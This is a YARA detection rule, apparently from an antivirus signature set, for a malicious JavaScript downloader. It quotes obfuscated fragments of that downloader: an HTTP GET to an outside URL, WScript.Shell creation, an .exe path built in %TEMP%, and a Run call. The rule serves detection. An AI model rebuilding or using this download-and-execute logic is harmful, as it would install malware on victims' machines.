rule sig_20160401_56aa90b37e7ed57de1f5a83caa7d3025 {
  meta:
    description = "datamaliciousorder - file 20160401_56aa90b37e7ed57de1f5a83caa7d3025.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a6c73d91eaf25b1eb12351707cd1f6eb289842d07d545ee195a5681d41877da"

  strings:
    $s1  = "HsXbr[PmXh](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function MfmYs(AhpPq, NcWb){RmfVuw = RmfVuw * 1; return AhpPq - NcWb;};" fullword ascii
    $s3  = "var SpEu = function JwWc() {return WScript[HqFza](\"WScript\"+\".Shell\");}(), BsLe = 11;" fullword ascii
    $s4  = "if (HsXbr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WizKwz(){return NqjHt + \"\";};" fullword ascii
    $s6  = "function MhrRpe() {return ((AryGo == true) && (AryGo == SvVk)) ? 1 : RmfVuw;};" fullword ascii
    $s7  = "function UhTe(KbOmg) {var XdbWgx = (1, 2, 3, 4, 5, KbOmg); return XdbWgx;};" fullword ascii
    $s8  = "}while (AqErh);" fullword ascii
    $s9  = "var SvVk = false;" fullword ascii
    $s10 = "var YcpZfr = new this[\"Date\"]();" fullword ascii
    $s11 = "var AryGo = false;" fullword ascii
    $s12 = "return MfmYs(TnHc, QdCzl);" fullword ascii
    $s13 = "function QvRyx(){return 23;};" fullword ascii
    $s14 = "function WihOxq(){return HqFza;};" fullword ascii
    $s15 = "function PkFnx() {return SpEu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"D96cakX9x.ex\" + \"e\";};" fullword ascii
    $s16 = "AryGo = true; " fullword ascii
    $s17 = "function TcwRh(OmqQj){SpEu[\"R\"+\"un\"](OmqQj, RmfVuw, RmfVuw);};" fullword ascii
    $s18 = "var OxdEfw = false;" fullword ascii
    $s19 = "SvVk = true; " fullword ascii
    $s20 = "function VeGy()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}